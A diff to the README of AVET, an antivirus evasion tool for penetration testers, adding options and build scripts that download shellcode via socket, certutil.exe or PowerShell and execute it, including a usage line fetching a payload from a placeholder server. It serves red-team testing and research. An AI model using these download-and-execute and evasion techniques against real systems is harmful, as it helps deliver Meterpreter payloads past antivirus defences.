@@ -2,7 +2,7 @@ AntiVirus Evasion Tool
 ======================
 
 AVET is an AntiVirus Evasion Tool, which was developed for making life easier for pentesters and for experimenting with antivirus evasion techniques.
-In version 1.2 new stuff was introduced, for a complete overview have a look at the CHANGELOG file.
+In version 1.3 new stuff was introduced, for a complete overview have a look at the CHANGELOG file.
 
 For basics about antivirus evasion, AVET & more information have a look here: 
 - https://govolution.wordpress.com/2017/07/27/paper-avet-blackhat-usa-2017/
@@ -40,8 +40,13 @@ Let's have a look at the options from make_avet, examples will be given below:
    when called with -E call with mytrojan.exe shellcode.txt
 -f compile shellcode into .exe, needs filename of shellcode file
 -u load and exec shellcode from url using internet explorer (url is compiled into executable)
--d download a raw shellcode via http in memory and exec (no overhead, use socket)
-   usage example: pwn.exe http://yourserver/yourpayload.bin
+-d download the shellcode file using different techniques
+   -d sock -> for downloading a raw shellcode via http in memory and exec (no overhead, use socket)
+      usage example: pwn.exe http://yourserver/yourpayload.bin
+   -d certutil -> use certutil.exe for downloading the file
+   -d powershell -> use powershell for downloading the file
+      usage of -d certutil/powershell in combination with -f
+      for executing the raw shellcode after downloading
 -E use avets ASCII encryption, often do not has to be used
    Can be used with -l
 -F use fopen sandbox evasion
@@ -91,6 +96,9 @@ See previous example.
 build_win32_meterpreter_rev_https_killswitch_shikata.sh
 AV evasion with the killswitch technique.
 
+build_win32_meterpreter_rev_https_shikata_download_certutil_raw_loadfile.sh
+Download a shellcode with the certutil.exe command and exec the shellcode.
+
 build_win32_meterpreter_rev_https_shikata_downloadexecshellcode_DKMC.sh
 Like build_win32_meterpreter_rev_https_shikata_downloadexecshellcode.sh, but also builds the
 payload with DKMC, a tool by https://github.com/mrun1k0d3r.
@@ -98,6 +106,9 @@ For more: https://govolution.wordpress.com/2018/03/02/download-exec-poc-and-dkmc
 
 build_win32_meterpreter_rev_https_shikata_downloadexecshellcode.sh
 This one downloads a shellcode from a webserver into memory and executes the shellcode.
+
+build_win32_meterpreter_rev_https_shikata_download_powershell_raw_loadfile.sh
+Download a shellcode with a powershell command and exec the shellcode.
 
 build_win32_meterpreter_rev_https_shikata_fopen.sh
 Sandbox evasion with fopen and additional encoding
